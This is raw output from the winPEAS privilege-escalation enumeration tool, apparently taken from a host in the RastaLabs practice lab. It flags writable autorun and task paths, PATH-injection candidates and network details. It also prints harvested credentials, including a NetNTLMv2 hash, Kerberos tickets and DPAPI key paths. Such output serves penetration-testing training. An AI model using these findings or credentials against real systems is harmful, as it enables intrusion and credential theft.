    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: MSVCRT
    Folder: None (PATH Injection)
    File: MSVCRT.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: NORMALIZ
    Folder: None (PATH Injection)
    File: NORMALIZ.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: NSI
    Folder: None (PATH Injection)
    File: NSI.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: ole32
    Folder: None (PATH Injection)
    File: ole32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: OLEAUT32
    Folder: None (PATH Injection)
    File: OLEAUT32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: PSAPI
    Folder: None (PATH Injection)
    File: PSAPI.DLL
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: rpcrt4
    Folder: None (PATH Injection)
    File: rpcrt4.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: sechost
    Folder: None (PATH Injection)
    File: sechost.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: Setupapi
    Folder: None (PATH Injection)
    File: Setupapi.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: SHCORE
    Folder: None (PATH Injection)
    File: SHCORE.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: SHELL32
    Folder: None (PATH Injection)
    File: SHELL32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: SHLWAPI
    Folder: None (PATH Injection)
    File: SHLWAPI.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: user32
    Folder: None (PATH Injection)
    File: user32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: WLDAP32
    Folder: None (PATH Injection)
    File: WLDAP32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: wow64
    Folder: None (PATH Injection)
    File: wow64.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: wow64win
    Folder: None (PATH Injection)
    File: wow64win.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: WS2_32
    Folder: None (PATH Injection)
    File: WS2_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{2C7339CF-2B09-4501-B3F3-F3508C9228ED}
    Key: StubPath
    Folder: \
    FolderPerms: Authenticated Users [Allow: AppendData/CreateDirectories]
    File: /UserInstall
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{6BF52A52-394A-11d3-B153-00C04F79FAA6}                                                                                                   
    Key: StubPath
    Folder: C:\WINDOWS\system32
    File: C:\WINDOWS\system32\unregmp2.exe /FirstLogon
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11cf-8B85-00AA005B4340}                                                                                                   
    Key: StubPath
    Folder: None (PATH Injection)
    File: U
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11cf-8B85-00AA005B4383}                                                                                                   
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\ie4uinit.exe -UserConfig
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89B4C1CD-B018-4511-B0A1-5476DBF70820}                                                                                                   
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\Rundll32.exe C:\Windows\System32\mscories.dll,Install
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{9459C573-B17A-45AE-9F64-1857B5D58CEE}                                                                                                   
    Key: StubPath
    Folder: C:\Program Files (x86)\Microsoft\Edge\Application\117.0.2045.60\Installer
    File: C:\Program Files (x86)\Microsoft\Edge\Application\117.0.2045.60\Installer\setup.exe --configure-user-settings --verbose-logging --system-level --msedge --channel=stable (Unquoted and Space detected) - C:\
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{6BF52A52-394A-11d3-B153-00C04F79FAA6}                                                                                       
    Key: StubPath
    Folder: C:\WINDOWS\system32
    File: C:\WINDOWS\system32\unregmp2.exe /FirstLogon
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{89B4C1CD-B018-4511-B0A1-5476DBF70820}                                                                                       
    Key: StubPath
    Folder: C:\Windows\SysWOW64
    File: C:\Windows\SysWOW64\Rundll32.exe C:\Windows\SysWOW64\mscories.dll,Install
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\{1FD49718-1D00-4B19-AF5F-070AF6D5D54C}                                                                              
    Folder: C:\Program Files (x86)\Microsoft\Edge\Application\117.0.2045.60\BHO
    File: C:\Program Files (x86)\Microsoft\Edge\Application\117.0.2045.60\BHO\ie_to_edge_bho_64.dll (Unquoted and Space detected) - C:\                                                                         
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\{1FD49718-1D00-4B19-AF5F-070AF6D5D54C}                                                                  
    Folder: C:\Program Files (x86)\Microsoft\Edge\Application\117.0.2045.60\BHO
    File: C:\Program Files (x86)\Microsoft\Edge\Application\117.0.2045.60\BHO\ie_to_edge_bho_64.dll (Unquoted and Space detected) - C:\                                                                         
   =================================================================================================


    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
    File: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini
    Potentially sensitive file content: LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21787
   =================================================================================================


    Folder: C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
    FolderPerms: tquinn [Allow: AllAccess]
    File: C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini (Unquoted and Space detected) - C:\Users\Administrator\AppData\Roaming\Microsoft\Windows,C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini                    
    FilePerms: tquinn [Allow: AllAccess]
    Potentially sensitive file content: LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21787
   =================================================================================================


    Folder: C:\Users\Administrator.WS06\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
    FolderPerms: tquinn [Allow: AllAccess]
    File: C:\Users\Administrator.WS06\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini (Unquoted and Space detected) - C:\Users\Administrator.WS06\AppData\Roaming\Microsoft\Windows
    FilePerms: tquinn [Allow: AllAccess]
    Potentially sensitive file content: LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21787
   =================================================================================================


    Folder: C:\Users\tquinn\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
    FolderPerms: tquinn [Allow: AllAccess]
    File: C:\Users\tquinn\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini (Unquoted and Space detected) - C:\Users\tquinn\AppData\Roaming\Microsoft\Windows,C:\Users\tquinn\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini                                         
    FilePerms: tquinn [Allow: AllAccess]
    Potentially sensitive file content: LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21787
   =================================================================================================


    Folder: C:\windows\tasks
    FolderPerms: Authenticated Users [Allow: WriteData/CreateFiles]
   =================================================================================================


    Folder: C:\windows\system32\tasks
    FolderPerms: Authenticated Users [Allow: WriteData/CreateFiles]
   =================================================================================================


    Folder: C:\windows
    File: C:\windows\system.ini
   =================================================================================================


    Folder: C:\windows
    File: C:\windows\win.ini
   =================================================================================================


    Key: From WMIC
    Folder: C:\ProgramData\Synaptics
    FolderPerms: tquinn [Allow: AllAccess], Users [Allow: WriteData/CreateFiles]
    File: C:\ProgramData\Synaptics\Synaptics.exe
    FilePerms: tquinn [Allow: AllAccess]
   =================================================================================================


    Key: From WMIC
    Folder: C:\WINDOWS\system32
    File: C:\WINDOWS\system32\SecurityHealthSystray.exe
   =================================================================================================


    Key: From WMIC
    Folder: C:\ProgramData\Phisherman
    File: C:\ProgramData\Phisherman\Phisherman.exe
   =================================================================================================


    Key: From WMIC
    Folder: C:\Program Files\VMware\VMware Tools
    File: C:\Program Files\VMware\VMware Tools\vmtoolsd.exe -n vmusr
   =================================================================================================


???????????? Scheduled Applications --Non Microsoft--
? Check if you can modify other users scheduled binaries https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.html                   
    (RLAB\tquinn) Daily Reboot: C:\Windows\System32\cmd.exe /c "shutdown /r /t 0"
    Trigger: At 17:00 every day
    
   =================================================================================================


???????????? Device Drivers --Non Microsoft--
? Check 3rd party drivers for known vulnerabilities/rootkits. https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#drivers                                           
    VMware vSockets Service - 9.8.19.0 build-18956547 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vsock.sys                                                                                      
    VMware PCI VMCI Bus Device - 9.8.18.0 build-18956547 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmci.sys                                                                                    
    LSI Fusion-MPT SAS Driver (StorPort) - 1.34.03.83 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas.sys                                                                                 
    VMware Pointing PS/2 Device Driver - 12.5.12.0 build-18967789 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmmouse.sys                                                                        
    VMware SVGA 3D - 9.17.07.0002 - build-22915930 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vm3dmp_loader.sys                                                                                 
    VMware SVGA 3D - 9.17.07.0002 - build-22915930 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vm3dmp.sys                                                                                        
    VMware PCIe Ethernet Adapter NDIS 6.30 (64-bit) - 1.9.14.0 build-22347299 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmxnet3.sys                                                            
    VMware server memory controller - 7.5.7.0 build-18933738 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vmmemctl.sys                                                                            


????????????????????????????????????? Network Information ?????????????????????????????????????

???????????? Network Shares
    ADMIN$ (Path: C:\WINDOWS)
    C$ (Path: C:\)
    IPC$ (Path: )

???????????? Enumerate Network Mapped Drives (WMI)
   Local Name         :       H:
   Remote Name        :       \\fs01.rastalabs.local\home$\tquinn
   Remote Path        :       \\fs01.rastalabs.local\home$\tquinn
   Status             :       OK
   Connection State   :       Connected
   Persistent         :       False
   UserName           :       RASTALABS.LOCAL\tquinn
   Description        :       RESOURCE CONNECTED - Microsoft Windows Network

   =================================================================================================


???????????? Host File

???????????? Network Ifaces and known hosts
? The masks are only for the IPv4 addresses 
    Ethernet0 2[00:50:56:94:76:AE]: 10.10.121.108, fe80::dbd2:1ef3:ab2c:36c8%3 / 255.255.254.0
        Gateways: 10.10.120.254
        DNSs: 10.10.120.1
        Known hosts:
          10.10.120.1           00-50-56-94-9D-C4     Dynamic
          10.10.120.5           00-50-56-94-45-22     Dynamic
          10.10.120.10          00-50-56-94-97-11     Dynamic
          10.10.120.254         00-50-56-94-AC-69     Dynamic
          10.10.121.255         FF-FF-FF-FF-FF-FF     Static
          224.0.0.22            01-00-5E-00-00-16     Static
          224.0.0.251           01-00-5E-00-00-FB     Static
          239.255.255.250       01-00-5E-7F-FF-FA     Static

    Loopback Pseudo-Interface 1[]: 127.0.0.1, ::1 / 255.0.0.0
        DNSs: fec0:0:0:ffff::1%1, fec0:0:0:ffff::2%1, fec0:0:0:ffff::3%1
        Known hosts:
          224.0.0.22            00-00-00-00-00-00     Static
          239.255.255.250       00-00-00-00-00-00     Static


???????????? Current TCP Listening Ports
? Check for services restricted from the outside 
  Enumerating IPv4 connections
                                                                                                        
  Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name

  TCP        0.0.0.0               135           0.0.0.0               0               Listening         924             svchost
  TCP        0.0.0.0               445           0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               5040          0.0.0.0               0               Listening         4864            svchost
  TCP        0.0.0.0               5985          0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               47001         0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               49664         0.0.0.0               0               Listening         684             lsass
  TCP        0.0.0.0               49665         0.0.0.0               0               Listening         556             wininit
  TCP        0.0.0.0               49666         0.0.0.0               0               Listening         1264            svchost
  TCP        0.0.0.0               49667         0.0.0.0               0               Listening         1292            svchost
  TCP        0.0.0.0               49669         0.0.0.0               0               Listening         2536            spoolsv
  TCP        0.0.0.0               49670         0.0.0.0               0               Listening         684             lsass
  TCP        0.0.0.0               49689         0.0.0.0               0               Listening         676             services
  TCP        10.10.121.108         139           0.0.0.0               0               Listening         4               System
  TCP        10.10.121.108         49701         10.10.120.5           445             Established       4               System
  TCP        10.10.121.108         50602         10.10.120.10          443             Established       3620            C:\ProgramData\Phisherman\Phisherman.exe
  TCP        10.10.121.108         63463         10.10.16.2            443             Established       1920            C:\Users\tquinn\AppData\Local\Microsoft\Windows\INetCache\IE\IRV36146\updata.exe
  TCP        10.10.121.108         63534         10.10.16.2            80              Close Wait        2528            C:\WINDOWS\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
  TCP        10.10.121.108         63724         10.10.120.5           445             Established       4               System
  TCP        10.10.121.108         63725         10.10.120.5           445             Established       4               System
  TCP        10.10.121.108         63726         10.10.120.5           445             Established       4               System
  TCP        10.10.121.108         63818         10.10.16.2            80              Established       5064            C:\WINDOWS\SysWOW64\WindowsPowerShell\v1.0\powershell.exe

  Enumerating IPv6 connections
                                                                                                        
  Protocol   Local Address                               Local Port    Remote Address                              Remote Port     State             Process ID      Process Name

  TCP        [::]                                        135           [::]                                        0               Listening         924             svchost
  TCP        [::]                                        445           [::]                                        0               Listening         4               System
  TCP        [::]                                        5985          [::]                                        0               Listening         4               System
  TCP        [::]                                        47001         [::]                                        0               Listening         4               System
  TCP        [::]                                        49664         [::]                                        0               Listening         684             lsass
  TCP        [::]                                        49665         [::]                                        0               Listening         556             wininit
  TCP        [::]                                        49666         [::]                                        0               Listening         1264            svchost
  TCP        [::]                                        49667         [::]                                        0               Listening         1292            svchost
  TCP        [::]                                        49669         [::]                                        0               Listening         2536            spoolsv
  TCP        [::]                                        49670         [::]                                        0               Listening         684             lsass
  TCP        [::]                                        49689         [::]                                        0               Listening         676             services

???????????? Current UDP Listening Ports
? Check for services restricted from the outside 
  Enumerating IPv4 connections
                                                                                                        
  Protocol   Local Address         Local Port    Remote Address:Remote Port     Process ID        Process Name

  UDP        0.0.0.0               123           *:*                            1092              svchost
  UDP        0.0.0.0               5050          *:*                            4864              svchost
  UDP        0.0.0.0               5353          *:*                            1180              svchost
  UDP        0.0.0.0               5355          *:*                            1180              svchost
  UDP        10.10.121.108         137           *:*                            4                 System
  UDP        10.10.121.108         138           *:*                            4                 System
  UDP        10.10.121.108         1900          *:*                            5824              svchost
  UDP        10.10.121.108         53222         *:*                            5824              svchost
  UDP        127.0.0.1             1900          *:*                            5824              svchost
  UDP        127.0.0.1             50885         *:*                            5516              C:\Users\tquinn\winpeas.exe
  UDP        127.0.0.1             53223         *:*                            5824              svchost
  UDP        127.0.0.1             55823         *:*                            1512              svchost
  UDP        127.0.0.1             60949         *:*                            684               lsass
  UDP        127.0.0.1             62627         *:*                            2708              svchost

  Enumerating IPv6 connections
                                                                                                        
  Protocol   Local Address                               Local Port    Remote Address:Remote Port     Process ID        Process Name

  UDP        [::]                                        123           *:*                            1092              svchost
  UDP        [::]                                        5353          *:*                            1180              svchost
  UDP        [::]                                        5355          *:*                            1180              svchost
  UDP        [::1]                                       1900          *:*                            5824              svchost
  UDP        [::1]                                       53221         *:*                            5824              svchost
  UDP        [fe80::dbd2:1ef3:ab2c:36c8%3]               1900          *:*                            5824              svchost
  UDP        [fe80::dbd2:1ef3:ab2c:36c8%3]               53220         *:*                            5824              svchost

???????????? Firewall Rules
? Showing only DENY rules (too many ALLOW rules always) 
    Current Profiles: DOMAIN
    FirewallEnabled (Domain):    True
    FirewallEnabled (Private):    True
    FirewallEnabled (Public):    True
    DENY rules:

???????????? DNS cached --limit 70--
    Entry                                 Name                                  Data
    dc01.rastalabs.local                  dc01.rastalabs.local                  10.10.120.1
    mx01.rastalabs.local                  mx01.rastalabs.local                  10.10.120.10

???????????? Enumerating Internet settings, zone and proxy configuration
  General Settings
  Hive        Key                                       Value
  HKCU        CertificateRevocation                     1
  HKCU        DisableCachingOfSSLPages                  0
  HKCU        IE5_UA_Backup_Flag                        5.0
  HKCU        PrivacyAdvanced                           1
  HKCU        SecureProtocols                           2048
  HKCU        User Agent                                Mozilla/4.0 (compatible; MSIE 8.0; Win32)
  HKCU        ZonesSecurityUpgrade                      System.Byte[]
  HKCU        WarnonZoneCrossing                        0
  HKCU        EnableNegotiate                           1
  HKCU        MigrateProxy                              1
  HKCU        ProxyEnable                               0
  HKCU        LockDatabase                              133426370519522292
  HKCU        SecureProtocolsUpdated                    1
  HKLM        ActiveXCache                              C:\Windows\Downloaded Program Files
  HKLM        CodeBaseSearchPath                        CODEBASE
  HKLM        EnablePunycode                            1
  HKLM        MinorVersion                              0
  HKLM        WarnOnIntranet                            1

  Zone Maps                                                                                             
  No URLs configured

  Zone Auth Settings                                                                                    
  No Zone Auth Settings

???????????? Internet Connectivity
? Checking if internet access is possible via different methods 
    HTTP (80) Access: Not Accessible
  [X] Exception:       Error: A task was canceled.
    HTTPS (443) Access: Not Accessible
  [X] Exception:       Error: TCP connect timed out
    HTTPS (443) Access by Domain Name: Not Accessible
  [X] Exception:       Error: A task was canceled.
    DNS (53) Access: Not Accessible
  [X] Exception:       Error: A connection attempt failed because the connected party did not properly respond after a period of time, or established connection failed because connected host has failed to respond                                                                                                    
    ICMP (ping) Access: Not Accessible
  [X] Exception:       Error: Ping failed: TimedOut

???????????? Hostname Resolution
? Checking if the hostname can be resolved externally 
  [X] Exception:     Error during hostname check: An error occurred while sending the request.


????????????????????????????????????? Active Directory Quick Checks ?????????????????????????????????????                                                                                                       

???????????? gMSA readable managed passwords
? Look for Group Managed Service Accounts you can read (msDS-ManagedPassword) https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/gmsa.html                                          
  [-] No gMSA with readable managed password found (checked 2).

???????????? AD CS misconfigurations for ESC
?  https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates.html
? Check for ADCS misconfigurations in the local DC registry
  [-] Host is not a domain controller. Skipping ADCS Registry check
? 
If you can modify a template (WriteDacl/WriteOwner/GenericAll), you can abuse ESC4                      
  [-] No templates with dangerous rights found (checked 0).


????????????????????????????????????? Cloud Information ?????????????????????????????????????
Learn and practice cloud hacking in training.hacktricks.xyz
AWS EC2?                                No   
Azure VM?                               No   
Azure Tokens?                           Yes  
Google Cloud Platform?                  No   
Google Workspace Joined?                No   
Google Cloud Directory Sync?            No   
Google Password Sync?                   No   

???????????? Azure Tokens Enumeration
  [X] Exception: The directory 'C:\Users\tquinn\AppData\Local\Microsoft\IdentityCache' does not exist.
  [X] Exception: An error occurred while scanning the identityCache directory: Could not find a part of the path 'C:\Users\tquinn\AppData\Local\Microsoft\IdentityCache'.                                       
Local Info



????????????????????????????????????? Windows Credentials ?????????????????????????????????????

???????????? Checking Windows Vault
?  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#credentials-manager--windows-vault                                                                           
    GUID: 4bf4c442-9b8a-41a0-b380-dd4a704ddb28
    Type: Web Credentials
    Resource: https://accounts.google.com/
    Identity: queentami84@gmail.com
    Last Modified: 19/03/2020 23:49:50
   =================================================================================================


???????????? Checking Credential manager
?  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#credentials-manager--windows-vault                                                                           
    [!] Warning: if password contains non-printable characters, it will be printed as unicode base64 encoded string


  [!] Unable to enumerate credentials automatically, error: 'Win32Exception: System.ComponentModel.Win32Exception (0x80004005): Element not found'
Please run: 
cmdkey /list

???????????? Saved RDP connections
    Not Found

???????????? Remote Desktop Server/Client Settings
  RDP Server Settings
    Network Level Authentication            :       
    Block Clipboard Redirection             :       
    Block COM Port Redirection              :       
    Block Drive Redirection                 :       
    Block LPT Port Redirection              :       
    Block PnP Device Redirection            :       
    Block Printer Redirection               :       
    Allow Smart Card Redirection            :       

  RDP Client Settings                                                                                   
    Disable Password Saving                 :       True
    Restricted Remote Administration        :       False

???????????? Recently run commands
    a: cmd\1
    MRUList: ba
    b: gpedit.msc\1

???????????? Checking for DPAPI Master Keys
?  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dpapi
    MasterKey: C:\Users\tquinn\AppData\Roaming\Microsoft\Protect\S-1-5-21-1396373213-2872852198-2033860859-2102\045f21ab-d49c-4bb6-a7b4-3af33566d423
    Accessed: 13/03/2026 17:09:48
    Modified: 04/11/2019 16:52:55
   =================================================================================================

    MasterKey: C:\Users\tquinn\AppData\Roaming\Microsoft\Protect\S-1-5-21-1396373213-2872852198-2033860859-2102\0fec21dc-bb98-46c9-b858-409ae7551a40
    Accessed: 13/03/2026 17:09:48
    Modified: 03/08/2020 10:52:04
   =================================================================================================

    MasterKey: C:\Users\tquinn\AppData\Roaming\Microsoft\Protect\S-1-5-21-1396373213-2872852198-2033860859-2102\31d80a4d-2a64-481e-8cc3-d9565f991fe6
    Accessed: 13/03/2026 17:09:48
    Modified: 05/05/2020 10:17:08
   =================================================================================================

    MasterKey: C:\Users\tquinn\AppData\Roaming\Microsoft\Protect\S-1-5-21-1396373213-2872852198-2033860859-2102\6dc3b77f-2ce8-44ae-9730-0d46c40c2017
    Accessed: 13/03/2026 17:09:55
    Modified: 28/08/2023 14:52:35
   =================================================================================================

    MasterKey: C:\Users\tquinn\AppData\Roaming\Microsoft\Protect\S-1-5-21-1396373213-2872852198-2033860859-2102\7cb64983-1e75-4fce-83ea-c9157be7c06d
    Accessed: 13/03/2026 17:09:48
    Modified: 14/09/2022 12:58:01
   =================================================================================================

    MasterKey: C:\Users\tquinn\AppData\Roaming\Microsoft\Protect\S-1-5-21-1396373213-2872852198-2033860859-2102\7fa9284d-b257-4cb7-b4b4-ad99bb574ec0
    Accessed: 13/03/2026 17:09:48
    Modified: 23/10/2024 15:20:33
   =================================================================================================

    MasterKey: C:\Users\tquinn\AppData\Roaming\Microsoft\Protect\S-1-5-21-1396373213-2872852198-2033860859-2102\84104df2-fa96-472d-ad7d-89b6d8ef6769
    Accessed: 13/03/2026 17:09:48
    Modified: 04/02/2020 15:57:03
   =================================================================================================

    MasterKey: C:\Users\tquinn\AppData\Roaming\Microsoft\Protect\S-1-5-21-1396373213-2872852198-2033860859-2102\a5fbe112-f7e3-4d97-b8fd-4cd94a62b8a5
    Accessed: 13/03/2026 17:09:48
    Modified: 09/08/2021 11:41:54
   =================================================================================================

    MasterKey: C:\Users\tquinn\AppData\Roaming\Microsoft\Protect\S-1-5-21-1396373213-2872852198-2033860859-2102\cb75a0cc-d373-44cd-bbe8-6efc25d3880c
    Accessed: 13/03/2026 17:10:02
    Modified: 13/03/2026 03:08:31
   =================================================================================================

    MasterKey: C:\Users\tquinn\AppData\Roaming\Microsoft\Protect\S-1-5-21-1396373213-2872852198-2033860859-2102\f72dc349-930a-41c4-8785-cfbe77f965ad
    Accessed: 13/03/2026 17:09:48
    Modified: 03/06/2022 00:41:09
   =================================================================================================


???????????? Checking for DPAPI Credential Files
?  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dpapi
    Not Found

???????????? Checking for RDCMan Settings Files
? Dump credentials from Remote Desktop Connection Manager https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#remote-desktop-credential-manager                     
    Not Found

???????????? Looking for Kerberos tickets
?  https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-kerberos-88/index.html
    serverName: krbtgt/RASTALABS.LOCAL
    RealmName: RASTALABS.LOCAL
    StartTime: 13/03/2026 17:09:38
    EndTime: 14/03/2026 03:09:30
    RenewTime: 20/03/2026 17:09:30
    EncryptionType: aes256_cts_hmac_sha1_96
    TicketFlags: name_canonicalize, pre_authent, renewable, forwarded, forwardable
   =================================================================================================

    serverName: krbtgt/RASTALABS.LOCAL
    RealmName: RASTALABS.LOCAL
    StartTime: 13/03/2026 17:09:30
    EndTime: 14/03/2026 03:09:30
    RenewTime: 20/03/2026 17:09:30
    EncryptionType: aes256_cts_hmac_sha1_96
    TicketFlags: name_canonicalize, pre_authent, initial, renewable, forwardable
   =================================================================================================

    serverName: ldap/dc01.rastalabs.local
    RealmName: RASTALABS.LOCAL
    StartTime: 13/03/2026 18:17:22
    EndTime: 14/03/2026 03:09:30
    RenewTime: 20/03/2026 17:09:30
    EncryptionType: aes256_cts_hmac_sha1_96
    TicketFlags: name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
   =================================================================================================

    serverName: cifs/fs01
    RealmName: RASTALABS.LOCAL
    StartTime: 13/03/2026 18:01:26
    EndTime: 14/03/2026 03:09:30
    RenewTime: 20/03/2026 17:09:30
    EncryptionType: aes256_cts_hmac_sha1_96
    TicketFlags: name_canonicalize, pre_authent, renewable, forwardable
   =================================================================================================

    serverName: cifs/dc01.rastalabs.local
    RealmName: RASTALABS.LOCAL
    StartTime: 13/03/2026 17:59:11
    EndTime: 14/03/2026 03:09:30
    RenewTime: 20/03/2026 17:09:30
    EncryptionType: aes256_cts_hmac_sha1_96
    TicketFlags: name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
   =================================================================================================

    serverName: HTTP/mx01.rastalabs.local
    RealmName: RASTALABS.LOCAL
    StartTime: 13/03/2026 17:10:08
    EndTime: 14/03/2026 03:09:30
    RenewTime: 20/03/2026 17:09:30
    EncryptionType: aes256_cts_hmac_sha1_96
    TicketFlags: name_canonicalize, pre_authent, renewable, forwardable
   =================================================================================================

    serverName: cifs/dc01.rastalabs.local/rastalabs.local
    RealmName: RASTALABS.LOCAL
    StartTime: 13/03/2026 17:09:38
    EndTime: 14/03/2026 03:09:30
    RenewTime: 20/03/2026 17:09:30
    EncryptionType: aes256_cts_hmac_sha1_96
    TicketFlags: name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
   =================================================================================================

    serverName: LDAP/dc01.rastalabs.local/rastalabs.local
    RealmName: RASTALABS.LOCAL
    StartTime: 13/03/2026 17:09:37
    EndTime: 14/03/2026 03:09:30
    RenewTime: 20/03/2026 17:09:30
    EncryptionType: aes256_cts_hmac_sha1_96
    TicketFlags: name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
   =================================================================================================

    serverName: cifs/fs01.rastalabs.local
    RealmName: RASTALABS.LOCAL
    StartTime: 13/03/2026 17:09:32
    EndTime: 14/03/2026 03:09:30
    RenewTime: 20/03/2026 17:09:30
    EncryptionType: aes256_cts_hmac_sha1_96
    TicketFlags: name_canonicalize, pre_authent, renewable, forwardable
   =================================================================================================


???????????? Looking for saved Wifi credentials
  [X] Exception: The service has not been started
Enumerating WLAN using wlanapi.dll failed, trying to enumerate using 'netsh'
No saved Wifi credentials found

???????????? Looking AppCmd.exe
?  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#appcmdexe                                                                                                    
    Not Found
      You must be an administrator to run this check

???????????? Looking SSClient.exe
?  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#scclient--sccm                                                                                               
    Not Found

???????????? Enumerating SSCM - System Center Configuration Manager settings

???????????? Enumerating Security Packages Credentials
  Version: NetNTLMv2
  Hash:    tquinn::RLAB:1122334455667788:221563be4457eeba3ae1d4edbd39ec82:010100000000000006624aa917b3dc01dbbcca128b638b10000000000800300030000000000000000000000000200000c66fae7ed842785eafb80d1094267530c8aca284d7486ba723a12825aed0d99f0a00100000000000000000000000000000000000090000000000000000000000              
                                                                                                        
   =================================================================================================



????????????????????????????????????? Browsers Information ?????????????????????????????????????

???????????? Showing saved credentials for Firefox
    Info: if no credentials were listed, you might need to close the browser and try again.

???????????? Looking for Firefox DBs
?  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history                                                                                             
    Not Found

???????????? Looking for GET credentials in Firefox history
?  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history                                                                                             
    Not Found

???????????? Showing saved credentials for Chrome
    Info: if no credentials were listed, you might need to close the browser and try again.

???????????? Looking for Chrome DBs
?  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history                                                                                             
    Not Found

???????????? Looking for GET credentials in Chrome history
?  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history                                                                                             
    Not Found

???????????? Chrome bookmarks
    Not Found

???????????? Showing saved credentials for Opera
    Info: if no credentials were listed, you might need to close the browser and try again.

